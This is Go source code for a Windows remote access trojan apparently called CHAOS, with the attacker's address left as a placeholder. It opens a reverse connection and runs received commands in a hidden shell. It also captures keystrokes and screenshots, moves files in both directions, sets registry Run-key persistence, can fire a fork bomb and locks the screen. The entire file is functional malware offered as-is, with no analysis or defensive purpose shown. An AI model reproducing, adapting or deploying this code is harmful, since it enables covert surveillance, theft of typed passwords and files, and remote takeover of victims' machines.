package main

import (
	"bufio"
	"encoding/base64"
	"image/png"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"syscall"
	"time"

	screenshot "github.com/kbinani/screenshot"
	goInfo "github.com/matishsiao/goInfo"
)

const (
	IP                 = "IPAddress:ServerPort"
	FILENAME           = "FileNameCHAOS"
	FOLDER_PATH        = "\\ProgramData"
	FOLDER_EXT         = "\\NameFolderExtesion"
	NEW_LINE    string = "\n"
)

var (
	dll, _              = syscall.LoadDLL("user32.dll")
	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
	GetKeyState, _      = dll.FindProc("GetKeyState")
	Logs                string
)

func main() {
	for {
		Connect()
	}
}

func Connect() {
	// Create a connection
	conn, err := net.Dial("tcp", IP)

	// If don't exist a connection created than try connect to a new
	if err != nil {
		log.Println("[*] Connecting...")
		for {
			Connect()
		}
	}

	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		command, _ := bufio.NewReader(conn).ReadString('\n')
		// log.Println(command)

		// When the command received are encoded,
		// decode message received, and test on switch
		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
		// log.Println(decodedCommand)

		switch string(decodedCommand) {

		case "back":
			conn.Close()
			Connect()

		case "exit":
			conn.Close()
			os.Exit(0)

		case "screenshot":
			SendMessage(conn, EncodeBytesToString(TakeScreenShot()))
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_start":
			go Keylogger() // Run a go routine for Keylogger function
			SendMessage(conn, " [i] Keylogger Listening!")
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_show":
			SendMessage(conn, Logs)
			RemoveNewLineCharFromConnection(conn)

		case "download":
			pathDownload := ReceiveMessageStdEncoding(conn)

			file, err := ioutil.ReadFile(string(pathDownload))
			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			SendMessage(conn, string(file))
			RemoveNewLineCharFromConnection(conn)

		case "upload":
			uploadInput := ReceiveMessageStdEncoding(conn)
			decUpload := ReceiveMessageURLEncoding(conn)
			if string(decUpload) != "" {
				ioutil.WriteFile(string(uploadInput), []byte(decUpload), 777)
			}

		case "getos":
			SendMessage(conn, GetOSInformation())
			RemoveNewLineCharFromConnection(conn)

		case "lockscreen":
			log.Println(RunCmdReturnByte("rundll32.exe user32.dll,LockWorkStation"))
			SendMessage(conn, "[i] Locked!")
			RemoveNewLineCharFromConnection(conn)

		case "ls":
			SendMessage(conn, EncodeBytesToString(RunCmdReturnByte("dir")))
			RemoveNewLineCharFromConnection(conn)

		case "persistence_enable":
			// Create a folder to save file
			os.MkdirAll(os.Getenv("systemdrive")+FOLDER_PATH+FOLDER_EXT, 0777)

			// Copy file to install path
			RunCmd("xcopy /Y " + FILENAME + " " + os.Getenv("systemdrive") + FOLDER_PATH + FOLDER_EXT)

			// Generate a .reg to install at startup
			CreateFile(os.Getenv("systemdrive")+FOLDER_PATH+FOLDER_EXT+"\\reg.bat", "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"CHAOS Startup\" /t REG_SZ /F /D "+"\""+"%systemdrive%"+FOLDER_PATH+FOLDER_EXT+"\\"+FILENAME+"\"")

			// Run .bat to install
			RunCmd(os.Getenv("systemdrive") + FOLDER_PATH + FOLDER_EXT + "\\reg.bat")

			// Check if file is created
			file := os.Getenv("systemdrive") + FOLDER_PATH + FOLDER_EXT + "\\" + FILENAME
			_, err := os.Stat(file)
			if err == nil {
				SendMessage(conn, "[*] Persistence Enabled!")
			} else if os.IsNotExist(err) {
				SendMessage(conn, "[!] Persistence Failed!")
			}

			RemoveNewLineCharFromConnection(conn)

		case "persistence_disable":
			// Remove directory
			os.RemoveAll(os.Getenv("systemdrive") + FOLDER_PATH + FOLDER_EXT)

			// Create a .reg to remove at startup
			CreateFile(os.Getenv("systemdrive")+FOLDER_PATH+"\\reg.bat", "REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"CHAOS Startup\" /F")

			// Run .bat to remove
			RunCmd(os.Getenv("systemdrive") + FOLDER_PATH + "\\reg.bat")

			SendMessage(conn, "[*] Persistence Disabled!")
			RemoveNewLineCharFromConnection(conn)

		case "bomb":
			// Create a file to run fork bomb
			CreateFile(os.Getenv("systemdrive")+FOLDER_PATH+"\\bomb.bat", "%0|%0")

			// Run file
			RunCmd(os.Getenv("systemdrive") + FOLDER_PATH + "\\bomb.bat && del " + os.Getenv("systemdrive") + FOLDER_PATH + "\\bomb.bat")

			SendMessage(conn, "[*] Executed Fork Bomb!")
			RemoveNewLineCharFromConnection(conn)

		case "openurl":
			// Receive url and run it
			url := ReceiveMessageStdEncoding(conn)
			RunCmd("start " + url)

			SendMessage(conn, "[*] Opened!")
			RemoveNewLineCharFromConnection(conn)
		} // end switch

		SendMessage(conn, RunCmdReturnString(command))

		_, err := conn.Read(make([]byte, 0))

		if err != nil {
			Connect()
		}
	}
}

func SendMessage(conn net.Conn, message string) {
	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + NEW_LINE))
}

func ReceiveMessageStdEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
	return string(messageDecoded)
}

func ReceiveMessageURLEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.URLEncoding.DecodeString(message)
	return string(messageDecoded)
}

func EncodeBytesToString(value []byte) string {
	return base64.URLEncoding.EncodeToString(value)
}

func RemoveNewLineCharFromConnection(conn net.Conn) {
	newLineChar, _ := bufio.NewReader(conn).ReadString('\n')
	log.Println(newLineChar)
}

func RunCmdReturnByte(cmd string) []byte {
	cmdExec := exec.Command("cmd", "/C", cmd)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, _ := cmdExec.Output()
	return c
}

func RunCmdReturnString(cmd string) string {
	cmdExec := exec.Command("cmd", "/C", cmd)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, _ := cmdExec.Output()
	return string(c)
}

func RunCmd(cmd string) {
	cmdExec := exec.Command("cmd", "/C", cmd)
	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	c, _ := cmdExec.Output()
	log.Println(c)
}

func CreateFile(path string, text string) {
	create, _ := os.Create(path)
	create.WriteString(text)
	create.Close()
}

func TakeScreenShot() []byte {
	// Create a path to save screenshto
	pathToSaveScreenshot := os.Getenv("systemdrive") + FOLDER_PATH + "\\screenshot.png"

	// Run func to get screenshot
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			Connect()
		}
		file, _ := os.Create(pathToSaveScreenshot)
		defer file.Close()
		png.Encode(file, img)
	}
	// end func to get screenshot

	// Read screenshot file
	file, err := ioutil.ReadFile(pathToSaveScreenshot)
	if err != nil {
		return nil
	}
	return file
}

func GetOSInformation() string {
	gi := goInfo.GetInfo()
	osInformation := "GoOS: " + gi.GoOS
	osInformation += "\n" + " Kernel: " + gi.Kernel
	osInformation += "\n" + " Core: " + gi.Core
	osInformation += "\n" + " Platform: " + gi.Platform
	osInformation += "\n" + " OS: " + gi.OS
	osInformation += "\n" + " Hostname: " + gi.Hostname
	osInformation += "\n" + " CPUs: " + strconv.Itoa(gi.CPUs)
	return osInformation
}


func IsPressed(key uintptr) bool {
	fmt.Println(key & 0x8000)
	if key&0x8000 != 0 { // is most significant bit set?
		return true
	}
	return false
}

func GetProperCase(ifPressed, ifNotPressed string, acknowledgeCaps bool) string {
	CapsLock, _, _ := GetKeyState.Call(uintptr(0x14))
	ShiftKey, _, _ := GetAsyncKeyState.Call(uintptr(0x10))

	var CapsIsActivated = false
	if acknowledgeCaps {
		CapsIsActivated = CapsLock&0x0001 != 0
	}

	if IsPressed(ShiftKey) || CapsIsActivated {
		return ifPressed
	}
	return ifNotPressed
}

func Keylogger() {
	for {

		time.Sleep(1 * time.Millisecond)

		for i := 0; i < 256; i++ {
			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))

			if Result&0x1 == 0 {
				continue
			}

			switch i {
			case 8:
				Logs += "[Backspace]"
			case 9:
				Logs += "[Tab]"
			case 13:
				Logs += "[Enter]"
			case 16:
				Logs += "[Shift]"
			case 17:
				Logs += "[Control]"
			case 18:
				Logs += "[Alt]"
			case 19:
				Logs += "[Pause]"
			case 27:
				Logs += "[Esc]"
			case 32:
				Logs += "[SpaceBar]"
			case 33:
				Logs += "[PageUp]"
			case 34:
				Logs += "[PageDown]"
			case 35:
				Logs += "[End]"
			case 36:
				Logs += "[Home]"
			case 37:
				Logs += "[Left]"
			case 38:
				Logs += "[Up]"
			case 39:
				Logs += "[Right]"
			case 40:
				Logs += "[Down]"
			case 44:
				Logs += "[PrintScreen]"
			case 45:
				Logs += "[Insert]"
			case 46:
				Logs += "[Delete]"
			case 48:
				Logs += GetProperCase("[)]", "[0]", false)
			case 49:
				Logs += GetProperCase("[!]", "[1]", false)
			case 50:
				Logs += GetProperCase("[@]", "[2]", false)
			case 51:
				Logs += GetProperCase("[#]", "[3]", false)
			case 52:
				Logs += GetProperCase("[$]", "[4]", false)
			case 53:
				Logs += GetProperCase("[%]", "[5]", false)
			case 54:
				Logs += GetProperCase("[^]", "[6]", false)
			case 55:
				Logs += GetProperCase("[&]", "[7]", false)
			case 56:
				Logs += GetProperCase("[*]", "[8]", false)
			case 57:
				Logs += GetProperCase("[(]", "[9]", false)
			case 65:
				Logs += GetProperCase("[A]", "[a]", true)
			case 66:
				Logs += GetProperCase("[B]", "[b]", true)
			case 67:
				Logs += GetProperCase("[C]", "[c]", true)
			case 186:
				Logs += GetProperCase("[Ç]", "[ç]", true)
			case 68:
				Logs += GetProperCase("[D]", "[d]", true)
			case 69:
				Logs += GetProperCase("[E]", "[e]", true)
			case 70:
				Logs += GetProperCase("[F]", "[f]", true)
			case 71:
				Logs += GetProperCase("[G]", "[g]", true)
			case 72:
				Logs += GetProperCase("[H]", "[h]", true)
			case 73:
				Logs += GetProperCase("[I]", "[i]", true)
			case 74:
				Logs += GetProperCase("[J]", "[j]", true)
			case 75:
				Logs += GetProperCase("[K]", "[k]", true)
			case 76:
				Logs += GetProperCase("[L]", "[l]", true)
			case 77:
				Logs += GetProperCase("[M]", "[m]", true)
			case 78:
				Logs += GetProperCase("[N]", "[n]", true)
			case 79:
				Logs += GetProperCase("[O]", "[o]", true)
			case 80:
				Logs += GetProperCase("[P]", "[p]", true)
			case 81:
				Logs += GetProperCase("[Q]", "[q]", true)
			case 82:
				Logs += GetProperCase("[R]", "[r]", true)
			case 83:
				Logs += GetProperCase("[S]", "[s]", true)
			case 84:
				Logs += GetProperCase("[T]", "[t]", true)
			case 85:
				Logs += GetProperCase("[U]", "[u]", true)
			case 86:
				Logs += GetProperCase("[V]", "[v]", true)
			case 87:
				Logs += GetProperCase("[W]", "[w]", true)
			case 88:
				Logs += GetProperCase("[X]", "[x]", true)
			case 89:
				Logs += GetProperCase("[Y]", "[y]", true)
			case 90:
				Logs += GetProperCase("[Z]", "[z]", true)
			case 96:
				Logs += "0"
			case 97:
				Logs += "1"
			case 98:
				Logs += "2"
			case 99:
				Logs += "3"
			case 100:
				Logs += "4"
			case 101:
				Logs += "5"
			case 102:
				Logs += "6"
			case 103:
				Logs += "7"
			case 104:
				Logs += "8"
			case 105:
				Logs += "9"
			case 106:
				Logs += "*"
			case 107:
				Logs += "+"
			case 109:
				Logs += "-"
			case 110:
				Logs += ","
			case 111:
				Logs += "/"
			case 112:
				Logs += "[F1]"
			case 113:
				Logs += "[F2]"
			case 114:
				Logs += "[F3]"
			case 115:
				Logs += "[F4]"
			case 116:
				Logs += "[F5]"
			case 117:
				Logs += "[F6]"
			case 118:
				Logs += "[F7]"
			case 119:
				Logs += "[F8]"
			case 120:
				Logs += "[F9]"
			case 121:
				Logs += "[F10]"
			case 122:
				Logs += "[F11]"
			case 123:
				Logs += "[F12]"
			case 91:
				Logs += "[Super]"
			case 93:
				Logs += "[Menu]"
			case 144:
				Logs += "[NumLock]"
			case 189:
				Logs += GetProperCase("[_]", "[-]", false)
			case 187:
				Logs += GetProperCase("[+]", "[=]", false)
			case 188:
				Logs += GetProperCase("[<]", "[,]", false)
			case 190:
				Logs += GetProperCase("[>]", "[.]", false)
			case 191:
				Logs += GetProperCase("[:]", "[;]", false)
			case 192:
				Logs += GetProperCase("[\"]", "[']", false)
			case 193:
				Logs += GetProperCase("[?]", "[/]", false)
			case 221:
				Logs += GetProperCase("[{]", "[[]", false)
			case 220:
				Logs += GetProperCase("[}]", "[]]", false)
			case 226:
				Logs += GetProperCase("[|]", "[\\]", false)
			}
		}
	}
}
